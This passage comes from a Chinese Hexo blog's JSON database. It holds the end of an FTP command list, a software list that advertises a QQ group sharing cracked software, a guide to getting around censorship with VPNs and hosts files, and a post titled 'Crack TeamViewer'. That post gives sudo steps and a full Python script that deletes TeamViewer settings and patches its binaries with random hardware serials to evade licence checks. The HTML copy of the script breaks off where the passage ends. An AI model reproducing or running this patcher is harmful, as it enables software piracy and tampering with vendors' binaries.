48.quote arg1，arg2…：将参数逐字发至远程ftp服务器，如：quote syst.</p>\n<p>　　49.recv remote-file[local-file]：同get。</p>\n<p>　　50.reget remote-file[local-file]：类似于get， 但若local-file存在，则从上次传输中断处续传。</p>\n<p>　　51.rhelp[cmd-name]：请求获得远程主机的帮助。</p>\n<p>　　52.rstatus[file-name]：若未指定文件名，则显示远程主机的状态， 否则显示文件状态。</p>\n<p>　　53.rename[from][to]：更改远程主机文件名。</p>\n<p>　　54.reset：清除回答队列。</p>\n<p>　　55.restart marker：从指定的标志marker处，重新开始get或put，如：restart 130。</p>\n<p>　　56.rmdir dir-name：删除远程主机目录。</p>\n<p>　　57.runique：设置文件名只一性存储，若文件存在，则在原文件后加后缀.1， .2等。</p>\n<p>　　58.send local-file[remote-file]：同put。</p>\n<p>　　59.sendport：设置PORT命令的使用。</p>\n<p>　　60.site arg1，arg2…：将参数作为SITE命令逐字发送至远程ftp主机。</p>\n<p>　　61.size file-name：显示远程主机文件大小，如：site idle 7200。</p>\n<p>　　62.status：显示当前ftp状态。</p>\n<p>　　63.struct[struct-name]：将文件传输结构设置为struct-name， 缺省时使用stream结构。</p>\n<p>　　64.sunique：将远程主机文件名存储设置为只一(与runique对应)。</p>\n<p>　　65.system：显示远程主机的操作系统类型。</p>\n<p>　　66.tenex：将文件传输类型设置为TENEX机的所需的类型。</p>\n<p>　　67.tick：设置传输时的字节计数器。</p>\n<p>　　68.trace：设置包跟踪。</p>\n<p>　　69.type[type-name]：设置文件传输类型为type-name，缺省为ascii，如:type binary，设置二进制传输方式。</p>\n<p>　　70.umask[newmask]：将远程服务器的缺省umask设置为newmask，如：umask 3</p>\n<p>　　71.user user-name[password][account]：向远程主机表明自己的身份，需要口令时，必须输入口令，如：user anonymous my@email。</p>\n<p>　　72.verbose：同命令行的-v参数，即设置详尽报告方式，ftp 服务器的所有响 应都将显示给用户，缺省为on.</p>\n<p>　　73.?[cmd]：同help.</p>\n"},{"title":"好用的插件软件","date":"2020-05-08T03:41:32.000Z","_content":"\n# 软件群\n> 自建了一个群:861960832 里面很多插件,破解软件等,有需要的可以吼一声,视频分享等等\n\n# Mac游戏开发安装的软件\n\n> 使用到的软件做下记录,以及提供给想学 unity 的人的一些帮助.\n\n>> * 1 :VPN  西部世界 VPN,Lantern\n>> * 2:下载类   百度网盘,Free Download Manager\n>> * 3:关系类  QQ,微信,企业微信\n>> * 4:效率类  Alfred 4 全局查找\n>> * 5:护眼类  flux\n>> * 6:Android 类   Android studio Android Crack Tool Android 文件传输 NoxAppPlayer(夜神模拟器)\n>> * 7: 解压缩类 BetterZip\n>> * 8: 文件对比类 Beyond Compare        Meld\n>> * 9: C++类 CMake CLion ReSharper\n>> * 10: SVN/Git类   Cornerstone     SmartSVN 11   GitHub Desktop\n>> * 11:  代码文档类  Dash\n>> * 12: 浏览类   Google Chrome            EdgeView 2         Path Finder\n>> * 13: 游戏引擎类 Epic 虚幻引擎 Unity3d\n>> * 14: 终端类   iTerm    brew   zsh 等\n>> * 15:思维导图类  iThoughtsX\n>> * 16:iOS 类: PP 助手  Xcode  Commond Line Tools\n>> * 17: 代码软件类   Rider          Visual studio Code      \n>> * 18:远程办公类    TeamViewer\n>> * 19:图片打包类    TexturePacker\n>> * 20:事件记录类    Things3\n>> * 21:FTP类   Transmit\n>> * 22:HTTP类  PostMan\n>> * 23:办公软件类  WPS microsoft office356 全家桶\n>> * 24:持续集成类 Jenkins\n>> * 25:Python 类 Python 安装包 PyCharm\n>> * 26:开发 Visual studio code / Visual studio\n>> * 27:效率类\n\n# Unity3d 插件\n> * ODIN 提高编辑器效率\n> * A*寻路插件\n\n# 有趣的网站\n","source":"_posts/Tools/好用的插件软件.md","raw":"---\ntitle: 好用的插件软件\ndate: 2020-05-08 11:41:32\ncategories:\n- 工具\ntags:\n- tool\n---\n\n# 软件群\n> 自建了一个群:861960832 里面很多插件,破解软件等,有需要的可以吼一声,视频分享等等\n\n# Mac游戏开发安装的软件\n\n> 使用到的软件做下记录,以及提供给想学 unity 的人的一些帮助.\n\n>> * 1 :VPN  西部世界 VPN,Lantern\n>> * 2:下载类   百度网盘,Free Download Manager\n>> * 3:关系类  QQ,微信,企业微信\n>> * 4:效率类  Alfred 4 全局查找\n>> * 5:护眼类  flux\n>> * 6:Android 类   Android studio Android Crack Tool Android 文件传输 NoxAppPlayer(夜神模拟器)\n>> * 7: 解压缩类 BetterZip\n>> * 8: 文件对比类 Beyond Compare        Meld\n>> * 9: C++类 CMake CLion ReSharper\n>> * 10: SVN/Git类   Cornerstone     SmartSVN 11   GitHub Desktop\n>> * 11:  代码文档类  Dash\n>> * 12: 浏览类   Google Chrome            EdgeView 2         Path Finder\n>> * 13: 游戏引擎类 Epic 虚幻引擎 Unity3d\n>> * 14: 终端类   iTerm    brew   zsh 等\n>> * 15:思维导图类  iThoughtsX\n>> * 16:iOS 类: PP 助手  Xcode  Commond Line Tools\n>> * 17: 代码软件类   Rider          Visual studio Code      \n>> * 18:远程办公类    TeamViewer\n>> * 19:图片打包类    TexturePacker\n>> * 20:事件记录类    Things3\n>> * 21:FTP类   Transmit\n>> * 22:HTTP类  PostMan\n>> * 23:办公软件类  WPS microsoft office356 全家桶\n>> * 24:持续集成类 Jenkins\n>> * 25:Python 类 Python 安装包 PyCharm\n>> * 26:开发 Visual studio code / Visual studio\n>> * 27:效率类\n\n# Unity3d 插件\n> * ODIN 提高编辑器效率\n> * A*寻路插件\n\n# 有趣的网站\n","slug":"Tools/好用的插件软件","published":1,"updated":"2020-05-12T02:42:41.562Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckfvz8cye00132gk7bd3l5n7x","content":"<h1 id=\"软件群\"><a href=\"#软件群\" class=\"headerlink\" title=\"软件群\"></a>软件群</h1><blockquote>\n<p>自建了一个群:861960832 里面很多插件,破解软件等,有需要的可以吼一声,视频分享等等</p>\n</blockquote>\n<h1 id=\"Mac游戏开发安装的软件\"><a href=\"#Mac游戏开发安装的软件\" class=\"headerlink\" title=\"Mac游戏开发安装的软件\"></a>Mac游戏开发安装的软件</h1><blockquote>\n<p>使用到的软件做下记录,以及提供给想学 unity 的人的一些帮助.</p>\n</blockquote>\n<blockquote>\n<blockquote>\n<ul>\n<li>1 :VPN  西部世界 VPN,Lantern</li>\n<li>2:下载类   百度网盘,Free Download Manager</li>\n<li>3:关系类  QQ,微信,企业微信</li>\n<li>4:效率类  Alfred 4 全局查找</li>\n<li>5:护眼类  flux</li>\n<li>6:Android 类   Android studio Android Crack Tool Android 文件传输 NoxAppPlayer(夜神模拟器)</li>\n<li>7: 解压缩类 BetterZip</li>\n<li>8: 文件对比类 Beyond Compare        Meld</li>\n<li>9: C++类 CMake CLion ReSharper</li>\n<li>10: SVN/Git类   Cornerstone     SmartSVN 11   GitHub Desktop</li>\n<li>11:  代码文档类  Dash</li>\n<li>12: 浏览类   Google Chrome            EdgeView 2         Path Finder</li>\n<li>13: 游戏引擎类 Epic 虚幻引擎 Unity3d</li>\n<li>14: 终端类   iTerm    brew   zsh 等</li>\n<li>15:思维导图类  iThoughtsX</li>\n<li>16:iOS 类: PP 助手  Xcode  Commond Line Tools</li>\n<li>17: 代码软件类   Rider          Visual studio Code      </li>\n<li>18:远程办公类    TeamViewer</li>\n<li>19:图片打包类    TexturePacker</li>\n<li>20:事件记录类    Things3</li>\n<li>21:FTP类   Transmit</li>\n<li>22:HTTP类  PostMan</li>\n<li>23:办公软件类  WPS microsoft office356 全家桶</li>\n<li>24:持续集成类 Jenkins</li>\n<li>25:Python 类 Python 安装包 PyCharm</li>\n<li>26:开发 Visual studio code / Visual studio</li>\n<li>27:效率类</li>\n</ul>\n</blockquote>\n</blockquote>\n<h1 id=\"Unity3d-插件\"><a href=\"#Unity3d-插件\" class=\"headerlink\" title=\"Unity3d 插件\"></a>Unity3d 插件</h1><blockquote>\n<ul>\n<li>ODIN 提高编辑器效率</li>\n<li>A*寻路插件</li>\n</ul>\n</blockquote>\n<h1 id=\"有趣的网站\"><a href=\"#有趣的网站\" class=\"headerlink\" title=\"有趣的网站\"></a>有趣的网站</h1>","site":{"data":{}},"excerpt":"","more":"<h1 id=\"软件群\"><a href=\"#软件群\" class=\"headerlink\" title=\"软件群\"></a>软件群</h1><blockquote>\n<p>自建了一个群:861960832 里面很多插件,破解软件等,有需要的可以吼一声,视频分享等等</p>\n</blockquote>\n<h1 id=\"Mac游戏开发安装的软件\"><a href=\"#Mac游戏开发安装的软件\" class=\"headerlink\" title=\"Mac游戏开发安装的软件\"></a>Mac游戏开发安装的软件</h1><blockquote>\n<p>使用到的软件做下记录,以及提供给想学 unity 的人的一些帮助.</p>\n</blockquote>\n<blockquote>\n<blockquote>\n<ul>\n<li>1 :VPN  西部世界 VPN,Lantern</li>\n<li>2:下载类   百度网盘,Free Download Manager</li>\n<li>3:关系类  QQ,微信,企业微信</li>\n<li>4:效率类  Alfred 4 全局查找</li>\n<li>5:护眼类  flux</li>\n<li>6:Android 类   Android studio Android Crack Tool Android 文件传输 NoxAppPlayer(夜神模拟器)</li>\n<li>7: 解压缩类 BetterZip</li>\n<li>8: 文件对比类 Beyond Compare        Meld</li>\n<li>9: C++类 CMake CLion ReSharper</li>\n<li>10: SVN/Git类   Cornerstone     SmartSVN 11   GitHub Desktop</li>\n<li>11:  代码文档类  Dash</li>\n<li>12: 浏览类   Google Chrome            EdgeView 2         Path Finder</li>\n<li>13: 游戏引擎类 Epic 虚幻引擎 Unity3d</li>\n<li>14: 终端类   iTerm    brew   zsh 等</li>\n<li>15:思维导图类  iThoughtsX</li>\n<li>16:iOS 类: PP 助手  Xcode  Commond Line Tools</li>\n<li>17: 代码软件类   Rider          Visual studio Code      </li>\n<li>18:远程办公类    TeamViewer</li>\n<li>19:图片打包类    TexturePacker</li>\n<li>20:事件记录类    Things3</li>\n<li>21:FTP类   Transmit</li>\n<li>22:HTTP类  PostMan</li>\n<li>23:办公软件类  WPS microsoft office356 全家桶</li>\n<li>24:持续集成类 Jenkins</li>\n<li>25:Python 类 Python 安装包 PyCharm</li>\n<li>26:开发 Visual studio code / Visual studio</li>\n<li>27:效率类</li>\n</ul>\n</blockquote>\n</blockquote>\n<h1 id=\"Unity3d-插件\"><a href=\"#Unity3d-插件\" class=\"headerlink\" title=\"Unity3d 插件\"></a>Unity3d 插件</h1><blockquote>\n<ul>\n<li>ODIN 提高编辑器效率</li>\n<li>A*寻路插件</li>\n</ul>\n</blockquote>\n<h1 id=\"有趣的网站\"><a href=\"#有趣的网站\" class=\"headerlink\" title=\"有趣的网站\"></a>有趣的网站</h1>"},{"title":"科学上网","date":"2020-05-08T03:41:32.000Z","_content":"\n经常需要浏览一些资料,所以需要进入某些网站查询\n\n# Google的一些插件:\n\n<!-- ![Google插件1](https://github.com/BingJin-Zheng/Record/blob/master/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/1.png)\n![Google插件2](https://github.com/BingJin-Zheng/Record/blob/master/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/2.png)\n![Google插件3](https://github.com/BingJin-Zheng/Record/blob/master/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/3.png) -->\n![Google插件1](1.png)\n![Google插件2](2.png)\n![Google插件3](3.png)\n\n谷歌上网助手可以帮你上Google不用翻墙,国内可下,自行搜索.\n自己在Google搭建翻墙vpn,自行搜索百度\n\n\n# hosts:\n\n自己将hosts替换电脑的[hosts](https://github.com/googlehosts/hosts)\n经常更新,上youtube不卡\n\n# 软件:\n\n[赛风](https://s3.amazonaws.com/psiphon/web/mjr4-p23r-puwl/zh/download.html)\n\n[freevpn](https://www.freevpn.pw/zh-cn/)\n\n以上任何操作不能上外网,出现任何问题本作者不承担责任.\ntip:go语言中,interface是万物之主(万物皆对象,interface可以代表任何类型)\n\n# GitHub 下载\n* 1:使用码云作为下载中转站\n* 2:使用 git clone https://github.com/xxxx/xxx.git 时,速度特别慢\n需要使用 git clone https://github.com.cnpmjs.org/xxx/xxx.git\n* 3:jsdelivr 提供免费的 CDN 加速\n","source":"_posts/Tools/科学上网.md","raw":"---\ntitle: 科学上网\ndate: 2020-05-08 11:41:32\ncategories:\n- 工具\ntags:\n- tool\n---\n\n经常需要浏览一些资料,所以需要进入某些网站查询\n\n# Google的一些插件:\n\n<!-- ![Google插件1](https://github.com/BingJin-Zheng/Record/blob/master/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/1.png)\n![Google插件2](https://github.com/BingJin-Zheng/Record/blob/master/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/2.png)\n![Google插件3](https://github.com/BingJin-Zheng/Record/blob/master/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/3.png) -->\n![Google插件1](1.png)\n![Google插件2](2.png)\n![Google插件3](3.png)\n\n谷歌上网助手可以帮你上Google不用翻墙,国内可下,自行搜索.\n自己在Google搭建翻墙vpn,自行搜索百度\n\n\n# hosts:\n\n自己将hosts替换电脑的[hosts](https://github.com/googlehosts/hosts)\n经常更新,上youtube不卡\n\n# 软件:\n\n[赛风](https://s3.amazonaws.com/psiphon/web/mjr4-p23r-puwl/zh/download.html)\n\n[freevpn](https://www.freevpn.pw/zh-cn/)\n\n以上任何操作不能上外网,出现任何问题本作者不承担责任.\ntip:go语言中,interface是万物之主(万物皆对象,interface可以代表任何类型)\n\n# GitHub 下载\n* 1:使用码云作为下载中转站\n* 2:使用 git clone https://github.com/xxxx/xxx.git 时,速度特别慢\n需要使用 git clone https://github.com.cnpmjs.org/xxx/xxx.git\n* 3:jsdelivr 提供免费的 CDN 加速\n","slug":"Tools/科学上网","published":1,"updated":"2020-07-16T12:42:58.552Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckfvz8cyg00172gk79keke376","content":"<p>经常需要浏览一些资料,所以需要进入某些网站查询</p>\n<h1 id=\"Google的一些插件\"><a href=\"#Google的一些插件\" class=\"headerlink\" title=\"Google的一些插件:\"></a>Google的一些插件:</h1><!-- ![Google插件1](https://github.com/BingJin-Zheng/Record/blob/master/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/1.png)\n![Google插件2](https://github.com/BingJin-Zheng/Record/blob/master/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/2.png)\n![Google插件3](https://github.com/BingJin-Zheng/Record/blob/master/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/3.png) -->\n<p><img src=\"/2020/05/08/Tools/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/1.png\" alt=\"Google插件1\"><br><img src=\"/2020/05/08/Tools/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/2.png\" alt=\"Google插件2\"><br><img src=\"/2020/05/08/Tools/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/3.png\" alt=\"Google插件3\"></p>\n<p>谷歌上网助手可以帮你上Google不用翻墙,国内可下,自行搜索.<br>自己在Google搭建翻墙vpn,自行搜索百度</p>\n<h1 id=\"hosts\"><a href=\"#hosts\" class=\"headerlink\" title=\"hosts:\"></a>hosts:</h1><p>自己将hosts替换电脑的<a href=\"https://github.com/googlehosts/hosts\" target=\"_blank\" rel=\"noopener\">hosts</a><br>经常更新,上youtube不卡</p>\n<h1 id=\"软件\"><a href=\"#软件\" class=\"headerlink\" title=\"软件:\"></a>软件:</h1><p><a href=\"https://s3.amazonaws.com/psiphon/web/mjr4-p23r-puwl/zh/download.html\" target=\"_blank\" rel=\"noopener\">赛风</a></p>\n<p><a href=\"https://www.freevpn.pw/zh-cn/\" target=\"_blank\" rel=\"noopener\">freevpn</a></p>\n<p>以上任何操作不能上外网,出现任何问题本作者不承担责任.<br>tip:go语言中,interface是万物之主(万物皆对象,interface可以代表任何类型)</p>\n<h1 id=\"GitHub-下载\"><a href=\"#GitHub-下载\" class=\"headerlink\" title=\"GitHub 下载\"></a>GitHub 下载</h1><ul>\n<li>1:使用码云作为下载中转站</li>\n<li>2:使用 git clone <a href=\"https://github.com/xxxx/xxx.git\" target=\"_blank\" rel=\"noopener\">https://github.com/xxxx/xxx.git</a> 时,速度特别慢<br>需要使用 git clone <a href=\"https://github.com.cnpmjs.org/xxx/xxx.git\" target=\"_blank\" rel=\"noopener\">https://github.com.cnpmjs.org/xxx/xxx.git</a></li>\n<li>3:jsdelivr 提供免费的 CDN 加速</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<p>经常需要浏览一些资料,所以需要进入某些网站查询</p>\n<h1 id=\"Google的一些插件\"><a href=\"#Google的一些插件\" class=\"headerlink\" title=\"Google的一些插件:\"></a>Google的一些插件:</h1><!-- ![Google插件1](https://github.com/BingJin-Zheng/Record/blob/master/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/1.png)\n![Google插件2](https://github.com/BingJin-Zheng/Record/blob/master/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/2.png)\n![Google插件3](https://github.com/BingJin-Zheng/Record/blob/master/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/3.png) -->\n<p><img src=\"/2020/05/08/Tools/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/1.png\" alt=\"Google插件1\"><br><img src=\"/2020/05/08/Tools/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/2.png\" alt=\"Google插件2\"><br><img src=\"/2020/05/08/Tools/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/3.png\" alt=\"Google插件3\"></p>\n<p>谷歌上网助手可以帮你上Google不用翻墙,国内可下,自行搜索.<br>自己在Google搭建翻墙vpn,自行搜索百度</p>\n<h1 id=\"hosts\"><a href=\"#hosts\" class=\"headerlink\" title=\"hosts:\"></a>hosts:</h1><p>自己将hosts替换电脑的<a href=\"https://github.com/googlehosts/hosts\" target=\"_blank\" rel=\"noopener\">hosts</a><br>经常更新,上youtube不卡</p>\n<h1 id=\"软件\"><a href=\"#软件\" class=\"headerlink\" title=\"软件:\"></a>软件:</h1><p><a href=\"https://s3.amazonaws.com/psiphon/web/mjr4-p23r-puwl/zh/download.html\" target=\"_blank\" rel=\"noopener\">赛风</a></p>\n<p><a href=\"https://www.freevpn.pw/zh-cn/\" target=\"_blank\" rel=\"noopener\">freevpn</a></p>\n<p>以上任何操作不能上外网,出现任何问题本作者不承担责任.<br>tip:go语言中,interface是万物之主(万物皆对象,interface可以代表任何类型)</p>\n<h1 id=\"GitHub-下载\"><a href=\"#GitHub-下载\" class=\"headerlink\" title=\"GitHub 下载\"></a>GitHub 下载</h1><ul>\n<li>1:使用码云作为下载中转站</li>\n<li>2:使用 git clone <a href=\"https://github.com/xxxx/xxx.git\" target=\"_blank\" rel=\"noopener\">https://github.com/xxxx/xxx.git</a> 时,速度特别慢<br>需要使用 git clone <a href=\"https://github.com.cnpmjs.org/xxx/xxx.git\" target=\"_blank\" rel=\"noopener\">https://github.com.cnpmjs.org/xxx/xxx.git</a></li>\n<li>3:jsdelivr 提供免费的 CDN 加速</li>\n</ul>\n"},{"title":"破解 TeamViewer","date":"2020-05-08T03:41:32.000Z","_content":"\n# 破解 TeamViewer\n\n* 1. 下载安装Teamviewer，安装完先退出登录\n\n* 2.下载破解文件 TeamViewer-id-changer.py,可搜索到\n\n* 3.打开控制台，运行‘sudo python 破解文件路径’（可直接把TeamViewer-id-changer.py文件拉进控制台获取到路径）按提示操作,TeamViewer-id-changer.py的代码在下面\n\n* 4.提示重启电脑，重启\n\n* 5.打开 Teamviewer\n\n\n\n``` \n    #!/usr/bin/env python \n\n    #coding:utf-8\n    import sys\n    import os\n    import glob\n    import platform\n    import re\n    import random\n    import string\n\n    print('''\n    --------------------------------\n    TeamViewer ID Changer for MAC OS\n    --------------------------------\n    ''')\n\n    if platform.system() != 'Darwin':\n        print('This script can be run only on MAC OS.')\n        sys.exit();\n\n    if os.geteuid() != 0:\n        print('This script must be run form root.')\n        sys.exit();\n\n    if os.environ.has_key('SUDO_USER'):\n        USERNAME = os.environ['SUDO_USER']\n        if USERNAME == 'root':\n        print('Can not find user name. Run this script via sudo from regular user')\n        sys.exit();\n    else:\n        print('Can not find user name. Run this script via sudo from regular user')\n        sys.exit();\n\n    HOMEDIRLIB = '/Users/' + USERNAME  + '/library/preferences/'\n    GLOBALLIB  =  '/library/preferences/'\n\n    CONFIGS = []\n\n    # Find config files\n\n    def listdir_fullpath(d):\n        return [os.path.join(d, f) for f in os.listdir(d)]\n\n    for file in listdir_fullpath(HOMEDIRLIB):\n        if 'teamviewer'.lower() in file.lower():\n            CONFIGS.append(file)\n\n    if not CONFIGS:\n        print ('''\n    There is no TemViewer configs found.\n    Maybe you have deleted it manualy or never run TeamViewer after installation.\n    Nothing to delete.\n    ''')\n    # Delete config files\n    else:\n        print(\"Configs found:\\n\")\n        for file in CONFIGS:\n            print file\n\n        print('''\n    This files will be DELETED permanently.\n    All TeamViewer settings will be lost\n    ''')\n        raw_input(\"Press Enter to continue or CTR+C to abort...\")\n\n        for file in CONFIGS:\n            try:\n                os.remove(file)\n            except:\n                print(\"Cannot delete config files. Permission denied?\")\n                sys.exit();\n        print(\"Done.\")\n\n    # Find binaryes\n\n    TMBINARYES = [\n    '/Applications/TeamViewer.app/Contents/MacOS/TeamViewer',\n    '/Applications/TeamViewer.app/Contents/MacOS/TeamViewer_Service',\n    '/Applications/TeamViewer.app/Contents/Helpers/TeamViewer_Desktop',\n    ]\n\n    for file in TMBINARYES:\n        if os.path.exists(file):\n            pass\n        else:\n            print(\"File not found: \" + file)\n            print (\"Install TeamViewer correctly\")\n            sys.exit();\n\n    # Patch files\n\n    def idpatch(fpath,platf,serial):\n        file = open(fpath, 'r+b')\n        binary = file.read()\n        PlatformPattern = \"IOPlatformExpert.{6}\"\n        SerialPattern =  \"IOPlatformSerialNumber%s%s%sUUID\"\n\n        binary = re.sub(PlatformPattern, platf, binary)\n        binary = re.sub(SerialPattern % (chr(0), \"[0-9a-zA-Z]{8,8}\", chr(0)), SerialPattern%(chr(0), serial, chr(0)), binary)\n\n        file = open(fpath,'wb').write(binary)\n        return True\n\n    def random_generator(size=8, chars=string.ascii_uppercase + string.digits):\n        return ''.join(random.choice(chars) for _ in range(size))\n\n    RANDOMSERIAL = random_generator()\n    RANDOMPLATFORM = \"IOPlatformExpert\" + random_generator(6)\n\n\n    for file in TMBINARYES:\n            try:\n                idpatch(file,RANDOMPLATFORM,RANDOMSERIAL)\n            except:\n                print \"Error: can not patch file \" + file\n                print \"Wrong version?\"\n                sys.exit();\n\n    print \"PlatformDevice: \" + RANDOMPLATFORM\n    print \"PlatformSerial: \" + RANDOMSERIAL\n\n    print('''\n    ID changed sucessfully.\n    !!! Restart computer before using TeamViewer !!!!\n    ''')\n\n\n```","source":"_posts/Tools/破解Teamviewer.md","raw":"---\ntitle: 破解 TeamViewer\ndate: 2020-05-08 11:41:32\ncategories:\n- 工具\ntags:\n- tool\n---\n\n# 破解 TeamViewer\n\n* 1. 下载安装Teamviewer，安装完先退出登录\n\n* 2.下载破解文件 TeamViewer-id-changer.py,可搜索到\n\n* 3.打开控制台，运行‘sudo python 破解文件路径’（可直接把TeamViewer-id-changer.py文件拉进控制台获取到路径）按提示操作,TeamViewer-id-changer.py的代码在下面\n\n* 4.提示重启电脑，重启\n\n* 5.打开 Teamviewer\n\n\n\n``` \n    #!/usr/bin/env python \n\n    #coding:utf-8\n    import sys\n    import os\n    import glob\n    import platform\n    import re\n    import random\n    import string\n\n    print('''\n    --------------------------------\n    TeamViewer ID Changer for MAC OS\n    --------------------------------\n    ''')\n\n    if platform.system() != 'Darwin':\n        print('This script can be run only on MAC OS.')\n        sys.exit();\n\n    if os.geteuid() != 0:\n        print('This script must be run form root.')\n        sys.exit();\n\n    if os.environ.has_key('SUDO_USER'):\n        USERNAME = os.environ['SUDO_USER']\n        if USERNAME == 'root':\n        print('Can not find user name. Run this script via sudo from regular user')\n        sys.exit();\n    else:\n        print('Can not find user name. Run this script via sudo from regular user')\n        sys.exit();\n\n    HOMEDIRLIB = '/Users/' + USERNAME  + '/library/preferences/'\n    GLOBALLIB  =  '/library/preferences/'\n\n    CONFIGS = []\n\n    # Find config files\n\n    def listdir_fullpath(d):\n        return [os.path.join(d, f) for f in os.listdir(d)]\n\n    for file in listdir_fullpath(HOMEDIRLIB):\n        if 'teamviewer'.lower() in file.lower():\n            CONFIGS.append(file)\n\n    if not CONFIGS:\n        print ('''\n    There is no TemViewer configs found.\n    Maybe you have deleted it manualy or never run TeamViewer after installation.\n    Nothing to delete.\n    ''')\n    # Delete config files\n    else:\n        print(\"Configs found:\\n\")\n        for file in CONFIGS:\n            print file\n\n        print('''\n    This files will be DELETED permanently.\n    All TeamViewer settings will be lost\n    ''')\n        raw_input(\"Press Enter to continue or CTR+C to abort...\")\n\n        for file in CONFIGS:\n            try:\n                os.remove(file)\n            except:\n                print(\"Cannot delete config files. Permission denied?\")\n                sys.exit();\n        print(\"Done.\")\n\n    # Find binaryes\n\n    TMBINARYES = [\n    '/Applications/TeamViewer.app/Contents/MacOS/TeamViewer',\n    '/Applications/TeamViewer.app/Contents/MacOS/TeamViewer_Service',\n    '/Applications/TeamViewer.app/Contents/Helpers/TeamViewer_Desktop',\n    ]\n\n    for file in TMBINARYES:\n        if os.path.exists(file):\n            pass\n        else:\n            print(\"File not found: \" + file)\n            print (\"Install TeamViewer correctly\")\n            sys.exit();\n\n    # Patch files\n\n    def idpatch(fpath,platf,serial):\n        file = open(fpath, 'r+b')\n        binary = file.read()\n        PlatformPattern = \"IOPlatformExpert.{6}\"\n        SerialPattern =  \"IOPlatformSerialNumber%s%s%sUUID\"\n\n        binary = re.sub(PlatformPattern, platf, binary)\n        binary = re.sub(SerialPattern % (chr(0), \"[0-9a-zA-Z]{8,8}\", chr(0)), SerialPattern%(chr(0), serial, chr(0)), binary)\n\n        file = open(fpath,'wb').write(binary)\n        return True\n\n    def random_generator(size=8, chars=string.ascii_uppercase + string.digits):\n        return ''.join(random.choice(chars) for _ in range(size))\n\n    RANDOMSERIAL = random_generator()\n    RANDOMPLATFORM = \"IOPlatformExpert\" + random_generator(6)\n\n\n    for file in TMBINARYES:\n            try:\n                idpatch(file,RANDOMPLATFORM,RANDOMSERIAL)\n            except:\n                print \"Error: can not patch file \" + file\n                print \"Wrong version?\"\n                sys.exit();\n\n    print \"PlatformDevice: \" + RANDOMPLATFORM\n    print \"PlatformSerial: \" + RANDOMSERIAL\n\n    print('''\n    ID changed sucessfully.\n    !!! Restart computer before using TeamViewer !!!!\n    ''')\n\n\n```","slug":"Tools/破解Teamviewer","published":1,"updated":"2020-05-16T08:25:38.878Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckfvz8cyi00192gk78uup2f6a","content":"<h1 id=\"破解-TeamViewer\"><a href=\"#破解-TeamViewer\" class=\"headerlink\" title=\"破解 TeamViewer\"></a>破解 TeamViewer</h1><ul>\n<li><ol>\n<li>下载安装Teamviewer，安装完先退出登录</li>\n</ol>\n</li>\n<li><p>2.下载破解文件 TeamViewer-id-changer.py,可搜索到</p>\n</li>\n<li><p>3.打开控制台，运行‘sudo python 破解文件路径’（可直接把TeamViewer-id-changer.py文件拉进控制台获取到路径）按提示操作,TeamViewer-id-changer.py的代码在下面</p>\n</li>\n<li><p>4.提示重启电脑，重启</p>\n</li>\n<li><p>5.打开 Teamviewer</p>\n</li>\n</ul>\n<pre><code>    #!/usr/bin/env python \n\n    #coding:utf-8\n    import sys\n    import os\n    import glob\n    import platform\n    import re\n    import random\n    import string\n\n    print(&#39;&#39;&#39;\n    --------------------------------\n    TeamViewer ID Changer for MAC OS\n    --------------------------------\n    &#39;&#39;&#39;)\n\n    if platform.system() != &#39;Darwin&#39;:\n        print(&#39;This script can be run only on MAC OS.&#39;)\n        sys.exit();\n\n    if os.geteuid() != 0:\n        print(&#39;This script must be run form root.&#39;)\n        sys.exit();\n\n    if os.environ.has_key(&#39;SUDO_USER&#39;):\n        USERNAME = os.environ[&#39;SUDO_USER&#39;]\n        if USERNAME == &#39;root&#39;:\n        print(&#39;Can not find user name. Run this script via sudo from regular user&#39;)\n        sys.exit();\n    else:\n        print(&#39;Can not find user name. Run this script via sudo from regular user&#39;)\n        sys.exit();\n\n    HOMEDIRLIB = &#39;/Users/&#39; + USERNAME  + &#39;/library/preferences/&#39;\n    GLOBALLIB  =  &#39;/library/preferences/&#39;\n\n    CONFIGS = []\n\n    # Find config files\n\n    def listdir_fullpath(d):\n        return [os.path.join(d, f) for f in os.listdir(d)]\n\n    for file in listdir_fullpath(HOMEDIRLIB):\n        if &#39;teamviewer&#39;.lower() in file.lower():\n            CONFIGS.append(file)\n\n    if not CONFIGS:\n        print (&#39;&#39;&#39;\n    There is no TemViewer configs found.\n    Maybe you have deleted it manualy or never run TeamViewer after installation.\n    Nothing to delete.\n    &#39;&#39;&#39;)\n    # Delete config files\n    else:\n        print(&quot;Configs found:\\n&quot;)\n        for file in CONFIGS:\n            print file\n\n        print(&#39;&#39;&#39;\n    This files will be DELETED permanently.\n    All TeamViewer settings will be lost\n    &#39;&#39;&#39;)\n        raw_input(&quot;Press Enter to continue or CTR+C to abort...&quot;)\n\n        for file in CONFIGS:\n            try:\n                os.remove(file)\n            except:\n                print(&quot;Cannot delete config files. Permission denied?&quot;)\n                sys.exit();\n        print(&quot;Done.&quot;)\n\n    # Find binaryes\n\n    TMBINARYES = [\n    &#39;/Applications/TeamViewer.app/Contents/MacOS/TeamViewer&#39;,\n    &#39;/Applications/TeamViewer.app/Contents/MacOS/TeamViewer_Service&#39;,\n    &#39;/Applications/TeamViewer.app/Contents/Helpers/TeamViewer_Desktop&#39;,\n    ]\n\n    for file in TMBINARYES:\n        